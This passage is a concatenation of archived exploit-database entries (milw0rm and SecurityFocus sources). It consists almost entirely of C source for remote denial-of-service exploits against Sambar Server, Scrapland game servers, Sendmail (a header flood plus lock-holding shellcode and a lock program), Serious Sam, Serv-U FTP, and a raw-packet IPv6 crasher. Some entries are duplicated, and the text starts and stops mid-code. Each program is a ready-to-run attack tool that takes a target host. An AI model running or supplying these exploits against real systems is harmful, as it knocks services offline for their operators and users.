      perror ("malloc: ");
      exit (EXIT_FAILURE);
    }

  /* initialise libnet */
  lnsock = libnet_init (LIBNET_RAW4_ADV, device, errbuf);
  if (lnsock == NULL)
    {
      fprintf (stderr, "libnet_init() failed: %s", errbuf);
      exit (-1);
    }

  if (!argv[2])
    src_ip = lookup ("127.0.0.1");
  else
    src_ip = lookup (argv[2]);

  dst_ip = lookup (argv[1]);

  /* Build the pseudo-IPv4 header */
  memset (buf, 0, sizeof buf);
  ip_hdr = (struct ip *) buf;
  ip_hdr->ip_v = 6;
  ip_hdr->ip_hl = 0;
  ip_hdr->ip_tos = 0;
  ip_hdr->ip_len = htons (IPV6_HDR_LEN + UDP_LEN);
  ip_hdr->ip_id = htons (0);
  ip_hdr->ip_off = htons (0);
  ip_hdr->ip_ttl = 0;
  ip_hdr->ip_p = 0;
  ip_hdr->ip_sum = 0;
  ip_hdr->ip_src.s_addr = src_ip;
  ip_hdr->ip_dst.s_addr = dst_ip;

  /* Build option header with poison bytes */
  opt_hdr = (struct opt *) (buf + IPV6_HDR_LEN);
  opt_hdr->nxt_hdr = 0x3C;      /* != 0x3B */
  opt_hdr->opt_len = 0x07;      /* length n such that:-
                                 *(((u_char *)opt_hdr) + n * 2) != 0x3B &&
                                 *(((u_char *)opt_hdr) + n * 2 + 1) == 0x00 &&
                                 n * 2 < IPV6_HDR_LEN + UDP_LEN */
                                /* a value of 0x00 will suffice!@$%! */

  printf ("Attacking %s", argv[1]);
  libnet_write_raw_ipv4 (lnsock, buf, IPV6_HDR_LEN + UDP_LEN);
  printf (".\n");

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-06-08]
source: http://www.securityfocus.com/bid/3885/info

Sambar Server is a multi-threaded web server which will run on Microsoft Windows 9x/ME/NT/2000 operating systems.

It is possible to cause a denial of service to Sambar Server by sending consecutive excessively long requests to the 'cgitest.exe' sample script.

The possibility exists that this issue may be the result of improper bounds checking. As a result, this vulnerability may potentially be used to execute arbitrary code on the host running the vulnerable software. Though this has not been confirmed.

While this issue was reported for Sambar Server 5.1, other versions may also be affected.

/*********************************************************************
**********
**
**               06.02.2002 - GREETZ TO WbC-BoArD & YAST CREW

**
**               Compiled with gcc under linux with kernel 2.4.17

**
**               Programname: Sambar Server 5.0  Manufacturer:Jalyn

**
**********************************************************************
*********/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define SERVER_PORT 80
#define MAX_MSG 100

  int sd, rc, i,j;
  char buf[5000];
  char msgtosnd[5024];
  char msgtoget[102400];
  char source[200000];
  struct sockaddr_in localAddr, servAddr;
  struct hostent *h;
  FILE *f1;

int main (int argc, char *argv[]) {
printf("Sleepy of Yast presents \"Sambar Server Production 5.0
Crasher\"\n");
if(argc != 2)
{
printf(">>> usage: %s <ip>",argv[0]);exit(0);
};
h = gethostbyname(argv[1]);
if(h==NULL)
{
printf("%s: unknown host '%s'\n",argv[0],argv[1]);
exit(1);
}
servAddr.sin_family = h->h_addrtype;
memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0],
h->h_length);
servAddr.sin_port = htons(SERVER_PORT);
sd = socket(AF_INET, SOCK_STREAM, 0);
if(sd<0)
{
perror("cannot open socket ");
exit(1);
}

localAddr.sin_family = AF_INET;
localAddr.sin_addr.s_addr = htonl(INADDR_ANY);
localAddr.sin_port = htons(0);
rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));

if(rc<0)
{
printf("%s: cannot bind port TCP %u\n",argv[0],SERVER_PORT);
perror("error ");
exit(1);
}
rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
if(rc<0)
{
perror("cannot connect ");
exit(1);
};
strcpy(buf,"A");
fprintf(stderr,"Entering Loop\n");
for(i=1;i<4000;i++)
{
strcat(buf,"A");
}
sprintf(msgtosnd,"GET /cgi-win/cgitest.exe?%s HTTP/1.1\nhost:
localhost\n\n\n",buf);
for(j=0;j<5;j++)
{
send(sd,msgtosnd,5024,0);
}
printf("\n\n BOOOOM");
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        28086
#define TIMEOUT     3

#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECV        if(timeout(sd) < 0) { \
                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                        exit(1); \
                    } \
                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len < 0) std_err();
#define ADDSHORT(x) *(u_short *)p = x; \
                    p += 2;
#define ADDLONG(x)  *(u_long *)p = x; \
                    p += 4;
#define ADDTEXT(x)  *p++ = sizeof(x) - 1; \
                    memcpy(p, x, sizeof(x) - 1); \
                    p += sizeof(x) - 1;



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            info[] =
                "\x7f"
                "\x01\x00"
                "\x00\x07",
            pck[] =
                "\x7f"
                "\x00\x00"
                "\x00\x00"
                "\x00",
            *p;


    setbuf(stdout, NULL);

    fputs("\n"
        "Scrapland <= 1.0 server termination "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " 1 = big text string (size>SSize)\n"
            " 2 = unexistent models (you can test this bug also modifying scrap.cfg)\n"
            " 3 = newpos<=size\n"
            " 4 = partial packet after small packet (1 or 2 bytes)\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr  = resolv(argv[2]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    SEND(info, sizeof(info) - 1);
    RECV;
    printf("\n  Server name   %s\n", buff + 10);
    printf("  Players       %d / %d\n\n",
        *(u_short *)(buff + 8), *(u_short *)(buff + 6));

    if(*(u_short *)(buff + 8) == *(u_short *)(buff + 6)) {
        fputs("- Alert: the server is full so this attack will fail\n\n", stdout);
    }

    fputs("- send BOOM packet\n", stdout);
    switch(atoi(argv[1])) {
        case 1: {
            pck[5] = 0xff;              // major than 0x7f
            *(u_short *)(pck + 1) = sizeof(pck) - 4;
            SEND(pck, sizeof(pck) - 1);
            } break;
        case 2: {
            p = buff;
            *p++ = 0x7f;
            p += 2;                     // data size
            ADDSHORT(0);                // don't know, pck related?
            ADDTEXT("Unnamed Player");  // PlayerName
            ADDTEXT("unexistent");      // PlayerModel
            ADDSHORT(65);               // PlayerMaxLife
            ADDTEXT("unexistent");      // PilotModel
            ADDTEXT("unexistent");      // Motor0Model
            ADDTEXT("unexistent");      // Motor1Model
            ADDTEXT("unexistent");      // Motor2Model
            ADDTEXT("unexistent");      // Motor3Model
            ADDTEXT("1,3,0,0,1,0,1");   // WeaponBayList
            ADDLONG(0);                 // PlayerTeamID
            *(u_short *)(buff + 1) = (p - buff) - 3;

            SEND(buff, p - buff);
            } break;
        case 3: {
            *(u_short *)(pck + 1) = 1;  // major than 0
            SEND(pck, 5);
            } break;
        case 4: {
            SEND(pck, 1);
            sleep(ONESEC);
            *(u_short *)(pck + 1) = 0;
            SEND(pck, 3);
            } break;
        default: {
            fputs("\nError: wrong attack selected\n\n", stdout);
            exit(1);
            }
    }

    fputs("- check server:\n", stdout);
    SEND(info, sizeof(info) - 1);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        28086
#define TIMEOUT     3

#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECV        if(timeout(sd) < 0) { \
                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                        exit(1); \
                    } \
                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len < 0) std_err();
#define ADDSHORT(x) *(u_short *)p = x; \
                    p += 2;
#define ADDLONG(x)  *(u_long *)p = x; \
                    p += 4;
#define ADDTEXT(x)  *p++ = sizeof(x) - 1; \
                    memcpy(p, x, sizeof(x) - 1); \
                    p += sizeof(x) - 1;



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            info[] =
                "\x7f"
                "\x01\x00"
                "\x00\x07",
            pck[] =
                "\x7f"
                "\x00\x00"
                "\x00\x00"
                "\x00",
            *p;


    setbuf(stdout, NULL);

    fputs("\n"
        "Scrapland <= 1.0 server termination "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " 1 = big text string (size>SSize)\n"
            " 2 = unexistent models (you can test this bug also modifying scrap.cfg)\n"
            " 3 = newpos<=size\n"
            " 4 = partial packet after small packet (1 or 2 bytes)\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr  = resolv(argv[2]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    SEND(info, sizeof(info) - 1);
    RECV;
    printf("\n  Server name   %s\n", buff + 10);
    printf("  Players       %d / %d\n\n",
        *(u_short *)(buff + 8), *(u_short *)(buff + 6));

    if(*(u_short *)(buff + 8) == *(u_short *)(buff + 6)) {
        fputs("- Alert: the server is full so this attack will fail\n\n", stdout);
    }

    fputs("- send BOOM packet\n", stdout);
    switch(atoi(argv[1])) {
        case 1: {
            pck[5] = 0xff;              // major than 0x7f
            *(u_short *)(pck + 1) = sizeof(pck) - 4;
            SEND(pck, sizeof(pck) - 1);
            } break;
        case 2: {
            p = buff;
            *p++ = 0x7f;
            p += 2;                     // data size
            ADDSHORT(0);                // don't know, pck related?
            ADDTEXT("Unnamed Player");  // PlayerName
            ADDTEXT("unexistent");      // PlayerModel
            ADDSHORT(65);               // PlayerMaxLife
            ADDTEXT("unexistent");      // PilotModel
            ADDTEXT("unexistent");      // Motor0Model
            ADDTEXT("unexistent");      // Motor1Model
            ADDTEXT("unexistent");      // Motor2Model
            ADDTEXT("unexistent");      // Motor3Model
            ADDTEXT("1,3,0,0,1,0,1");   // WeaponBayList
            ADDLONG(0);                 // PlayerTeamID
            *(u_short *)(buff + 1) = (p - buff) - 3;

            SEND(buff, p - buff);
            } break;
        case 3: {
            *(u_short *)(pck + 1) = 1;  // major than 0
            SEND(pck, 5);
            } break;
        case 4: {
            SEND(pck, 1);
            sleep(ONESEC);
            *(u_short *)(pck + 1) = 0;
            SEND(pck, 3);
            } break;
        default: {
            fputs("\nError: wrong attack selected\n\n", stdout);
            exit(1);
            }
    }

    fputs("- check server:\n", stdout);
    SEND(info, sizeof(info) - 1);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-02-28]
source: http://www.securityfocus.com/bid/8674/info

Sendmail has been reported prone to a denial of service vulnerability when handling malicious SMTP mail headers. The vulnerability has been reported to present itself, due to an inefficient implementation of a header prescan algorithm.

A remote attacker may reportedly deny service to legitimate users by sending specially crafted emails to the affected service.

/*
	      against.c - Another Sendmail (and pine ;-) DoS (up to 8.9.2)
	      (c) 1999 by <marchew@linux.lepszy.od.kobiety.pl>
	
	      Usage: ./against existing_user_on_victim_host victim_host
	      Example: ./against nobody lamers.net
	
	    */
	
	    #include <stdio.h>
	    #include <unistd.h>
	    #include <sys/param.h>
	    #include <sys/socket.h>
	    #include <sys/time.h>
	    #include <netinet/in.h>
	    #include <netdb.h>
	    #include <stdarg.h>
	    #include <errno.h>
	    #include <signal.h>
	    #include <getopt.h>
	    #include <stdlib.h>
	    #include <string.h>
	
	    #define MAXCONN 4
	    #define LINES   15000
	
	    struct hostent *hp;
	    struct sockaddr_in s;
	    int suck,loop,x;
	
	    int main(int argc,char* argv[]) {
	
	      printf("against.c - another Sendmail DoS (up to 8.9.2)\n");
	
	      if (argc-3) {
		printf("Usage: %s victim_user victim_host\n",argv[0]);
		exit(0);
	      }
	
	      hp=gethostbyname(argv[2]);
	
	      if (!hp) {
		perror("gethostbyname");
		exit(1);
	      }
	
	      fprintf(stderr,"Doing mess: ");
	
	      for (;loop<MAXCONN;loop++) if (!(x=fork())) {
		FILE* d;
		bcopy(hp->h_addr,(void*)&s.sin_addr,hp->h_length);
		s.sin_family=hp->h_addrtype;
		s.sin_port=htons(25);
		if ((suck=socket(AF_INET,SOCK_STREAM,0))<0) perror("socket");
		if (connect(suck,(struct sockaddr *)&s,sizeof(s))) perror("connect");
		if (!(d=fdopen(suck,"w"))) { perror("fdopen"); exit(0); }
	
		usleep(100000);
	
		fprintf(d,"helo tweety\n");
		fprintf(d,"mail from: tweety@polbox.com\n");
		fprintf(d,"rcpt to: %s@%s\n",argv[1],argv[2]);
		fprintf(d,"data\n");
	
		usleep(100000);
	
		for(loop=0;loop<LINES;loop++) {
		  if (!(loop%100)) fprintf(stderr,".");
		  fprintf(d,"To: x\n");
		}
	
		fprintf(d,"\n\n\nsomedata\n\n\n");
	
		fprintf(d,".\n");
	
		sleep(1);
	
		fprintf(d,"quit\n");
		fflush(d);
	
		sleep(100);
		shutdown(suck,2);
		close(suck);
		exit(0);
	      }
	
	      waitpid(x,&loop,0);
	
	      fprintf(stderr,"ok\n");
	
	      return 0;
	    }
source: http://www.securityfocus.com/bid/4822/info

Sendmail is a MTA for Unix and Linux variants.

There is a vulnerability in Sendmail that will lead to a denial of service condition. The vulnerability occurs when a malicious user acquires an exclusive lock on files that Sendmail requires for operation. 

/*

FreeBSD Sendmail DoS shellcode that locks /etc/mail/aliases.db
Written by zillion (at http://www.safemode.org && http://www.snosoft.com)

More info: http://www.sendmail.org/LockingAdvisory.txt

*/

char shellcode[] =
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x14\x50\x56\xb0\x05\x50\xcd\x80"
        "\x6a\x02\x50\xb0\x83\x50\xcd\x80\x80\xe9\x03\x78\xfe\xe8\xe1"
        "\xff\xff\xff\x2f\x65\x74\x63\x2f\x6d\x61\x69\x6c\x2f\x61\x6c"
        "\x69\x61\x73\x65\x73\x2e\x64\x62";

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}


source: http://www.securityfocus.com/bid/4822/info
 
Sendmail is a MTA for Unix and Linux variants.
 
There is a vulnerability in Sendmail that will lead to a denial of service condition. The vulnerability occurs when a malicious user acquires an exclusive lock on files that Sendmail requires for operation. 

#include <fcntl.h>
#include <unistd.h>

/*

Stupid piece of code to test the sendmail lock vulnerability on
FreeBSD. Run this and try sendmail -t on FreeBSD for example.

More info: http://www.sendmail.org/LockingAdvisory.txt

zillion (at safemode.org && snosoft.com)
http://www.safemode.org
http://www.snosoft.com

*/

int main() {

  if(fork() == 0) {

    char *lock1 = "/etc/mail/aliases";
    char *lock2 = "/etc/mail/aliases.db";
    char *lock3 = "/var/log/sendmail.st";

    int fd;
    fd = open(lock1,O_RDONLY);
    flock(fd,0x02);

    fd = open(lock2,O_RDONLY);
    flock(fd,0x02);

    fd = open(lock3,O_RDONLY);
    flock(fd,0x02);

    /* We are here to stay! */

    for(;;) {}

  }
}

source: http://www.securityfocus.com/bid/8936/info

It has been reported that Serious Sam game engine is vulnerable to a remote denial of service vulnerability due to a failure to handle exceptional conditions. This issue occurs when the client sends a certain malformed parameter to the server. This request may cause the software to consume an excessive amount of CPU cycles leading to a crash or hang.

Successful exploitation of this issue may allow an attacker to cause the software to act in an unstable manner leading to a crash or hang.

It has been reported that Serious Sam engines and games that run on the TCP protocol are vulnerable to this issue however other games and versions could be affected as well.

----------------------------------sam.h---------------------------------------

/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

----------------------------------sam.c---------------------------------------

/*

by Luigi Auriemma


This source is covered by GNU/GPL

UNIX & WIN VERSION
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN
    #include <winsock.h>
    #include <malloc.h>
    #include "winerr.h"

    #define close       closesocket
    #define ONESEC      1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>

    #define ONESEC      1
#endif






#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        25600
#define TIMEWAIT    5







u_long resolv(char *host);
void std_err(void);








int main(int argc, char *argv[]) {
    int         sd,
                err,
                port;
    struct  sockaddr_in     peer;
    u_char      *buff,
                type,
                pck[] =
/* bug */   "\xff\xff\xff\xff"
            "\x40\xE1\xDE\x03\xFB\xCA\x2A\xBC\x83\x01\x00\x00\x07\x47\x41"
            "\x54\x56\x10\x27\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x00"
            "\x00\x01\x00\x00\x00\xA0\x0F\x00\x00\x64\x00\x00\x00";



    setbuf(stdout, NULL);

    fputs("\n"
        "Serious Sam TCP remote crash/freeze "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\nUsage: %s <type> <server> [port(%u)]\n"
            "\nType of crash:\n"
            "0 = crash (0xffffffff)\n"
            "1 = freeze (0xfffffff0)\n"
            "\n", argv[0], PORT);
        exit(1);
    }



#ifdef WIN
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    type = argv[1][0] & 1;
    if(type) memcpy(pck, "\xf0\xff\xff\xff", 4);
        else memcpy(pck, "\xff\xff\xff\xff", 4);


    if(argc > 3) port = atoi(argv[3]);
        else port = PORT;

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    buff = malloc(BUFFSZ);
    if(!buff) std_err();


    printf("\nConnection to %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
    if(err < 0) std_err();



        /* 1 recv */

    err = recv(sd, buff, BUFFSZ, 0);
    if(err < 0) std_err();
    if(!err) {
        fputs("\nError: the server has closed the connection, retry\n", 
stdout);
        exit(1);
    }
    fputc('.', stdout);



        /* BOOOOOM */

    err = send(sd, pck, sizeof(pck) - 1, 0);
    if(err < 0) std_err();

    fputs("\nMalformed data sent, now I need to wait some seconds...\n", 
stdout);

    for(err = TIMEWAIT; err > 0; err--) {
        printf("%d\r", err);
        sleep(ONESEC);
    }

    close(sd);


    fputs("\nThe exploit is terminated and the server should be down, 
check it\n", stdout);

    free(buff);
    return(0);
}










u_long resolv(char *host) {
    struct    hostent    *hp;
    u_long    host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }

    return(host_ip);
}







#ifndef WIN
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif




/*
denial of service in Serv-u up to 5.2
str0ke@milw0rm.com - www.milw0rm.com

Advisory: http://www.securitytracker.com/alerts/2004/Sep/1011219.html

Ya its useless.  

*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>

#define SERVER_PORT 21
usage(char *name)
{
printf("usage: %s -h hostname/ip -u user -p passwd\n",name);
printf("\t\tstr0ke - Serv-U up to 5.2 Denial of Service\n");
exit(0);
}

main(int argc, char *argv[]) {
 char buffer[1000],host[255],user[255],pass[255],c;
 int sd, rc, i=0;
 struct sockaddr_in localAddr, servAddr;
 struct hostent *h;

if ( argc < 3) {
usage(argv[0]);
}

while ((c = getopt (argc, argv, "h:u:p:")) != EOF)
       switch(c)
       {
               case 'h':
                       strncpy(host,optarg,sizeof(host));
                       break;
               case 'u':
                       strncpy(user,optarg,sizeof(user));
                       break;
               case 'p':
                       strncpy(pass,optarg,sizeof(pass));
                       break;
       }

 h = gethostbyname(host);
 if(h==NULL) {
   printf("unknown host '%s'\n",host);
   exit(1);
 }

 servAddr.sin_family = h->h_addrtype;
 memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
 servAddr.sin_port = htons(SERVER_PORT);
 sd = socket(AF_INET, SOCK_STREAM, 0);
 if(sd<0) {
   perror("cannot open socket ");
   exit(1);
 }

 localAddr.sin_family = AF_INET;
 localAddr.sin_addr.s_addr = htonl(INADDR_ANY);
 localAddr.sin_port = htons(0);

 rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));
 if(rc<0) {
   printf("%d: cannot bind port TCP %u\n",sd,SERVER_PORT);
   perror("error ");
   exit(1);
 }

 printf("Trying To Connect To [%s]\n",host);
 rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
 if(rc<0) {
   perror("cannot connect ");
   exit(1);
 }
   printf("Trying Login With [%s]\n",user);
   snprintf(buffer,sizeof(buffer), "USER %s\r\n", user);
   rc = send(sd, buffer, strlen(buffer), 0);
   memset(buffer,0,sizeof(buffer));
while(1)
       {
       rc=recv(sd,buffer,sizeof(buffer),0);
       if(strstr(buffer,"331")) break;
